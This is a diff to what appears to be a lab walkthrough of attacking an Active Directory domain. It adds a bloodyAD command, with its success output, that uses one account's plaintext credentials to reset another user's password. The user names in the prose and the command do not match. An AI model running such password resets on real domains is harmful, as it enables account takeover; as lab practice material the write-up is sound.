@@ -657,5 +657,12 @@ The user `noah.sanders` has GenericAll over the `IT support` OU with 7 members w
 Out of those 7 users, `steve.miller` looks the most interesting since he has outbound object control and the others dont!
 
 ```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.wills -p 'Password123!' set password 'noah.sanders' 'Password123!'
+[+] Password changed successfully!
+```
+
+First ill change the password for `noah.sanders` 
+
+```python
 
 ```
